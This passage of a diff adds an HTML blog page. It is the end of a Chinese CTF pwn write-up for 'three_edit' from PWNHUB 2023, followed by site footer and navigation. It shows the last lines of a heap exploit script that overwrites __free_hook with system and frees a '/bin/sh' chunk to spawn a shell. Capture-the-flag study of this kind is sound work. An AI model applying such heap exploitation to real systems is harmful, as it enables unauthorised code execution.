+chunk3
+chunk__
+chunk4
+&#x27;&#x27;&#x27;</span>
+add(<span class="hljs-number">1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;e&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># chunk1=chunk__</span>
+
+delete(<span class="hljs-number">10</span>)          
+delete(<span class="hljs-number">0</span>)       <span class="hljs-comment"># chunk0=&gt;chunk10</span>
+
+edit(<span class="hljs-number">1</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x81</span>) + p64(free_hook)) <span class="hljs-comment"># chunk0(chunk4)=&gt;free_hook</span>
+add(<span class="hljs-number">10</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)    <span class="hljs-comment"># chunk10=chunk0</span>
+add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, p64(system_addr))  <span class="hljs-comment"># free_hook=system_addr</span>
+
+delete(<span class="hljs-number">10</span>)    <span class="hljs-comment"># free(chunk10_)=system(&#x27;/bin/sh&#x27;)</span>
+</code></pre>
+<p>这部分的利用手法和part1一模一样，攻击思路是劫持<code>free_hook</code><br />
+<img data-src="/images/202303pwnhub/te14.png" alt="" /></p>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2023-03-26 16:39:56" itemprop="dateModified" datetime="2023-03-26T16:39:56+08:00">2023-03-26</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="岚沐 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="岚沐 Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="岚沐 PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>岚沐 <i class="ic i-at"><em>@</em></i>CTFer
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2023/03/26/2023-3-PWHHUB/" title="2023_3_PWHHUB">http://example.com/2023/03/26/2023-3-PWHHUB/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/03/08/SROP/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipex2cdtbj20zk0m8x6p.jpg" title="SROP">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>SROP</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sh_v11"><span class="toc-number">1.</span> <span class="toc-text"> sh_v1.1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#three_edit"><span class="toc-number">2.</span> <span class="toc-text"> three_edit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text"> 调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 漏洞点分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part1"><span class="toc-number">2.1.2.</span> <span class="toc-text"> part1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part2"><span class="toc-number">2.1.3.</span> <span class="toc-text"> part2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part3"><span class="toc-number">2.1.4.</span> <span class="toc-text"> part3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part4"><span class="toc-number">2.1.5.</span> <span class="toc-text"> part4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part5"><span class="toc-number">2.1.6.</span> <span class="toc-text"> part5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part6"><span class="toc-number">2.1.7.</span> <span class="toc-text"> part6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#part6-2"><span class="toc-number">2.1.8.</span> <span class="toc-text"> part6</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="岚沐"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">岚沐</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">24</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">6</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>About</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/07/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="sql注入学习">sql注入学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/24/%E9%95%BF%E5%9F%8E%E6%9D%AFCrypto/" title="长城杯Crypto">长城杯Crypto</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/29/2022-hackgame%E5%A4%8D%E7%8E%B0/" title="2022-hackgame复现">2022-hackgame复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/12/26/PWNHUB-%E5%A4%8D%E7%8E%B0/" title="PWNHUB-复现">PWNHUB-复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/03/Sage%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Sage的使用">Sage的使用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/29/NTRU/" title="NTRU">NTRU</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/03/%E6%A0%BC%E5%AF%86%E7%A0%81/" title="格密码">格密码</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/03/i%E6%98%A5%E7%A7%8B%E5%8B%87%E8%80%85%E4%B9%8B%E5%B7%85Crypto%E5%AD%A6%E4%B9%A0/" title="i春秋勇者之巅Crypto学习">i春秋勇者之巅Crypto学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/03/08/SROP/" title="SROP">SROP</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/25/ciscn-pwn%E6%B3%9B%E5%81%9A/" title="ciscn_pwn泛做">ciscn_pwn泛做</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">岚沐 @ Arashimuのblog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/03/26/2023-3-PWHHUB/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
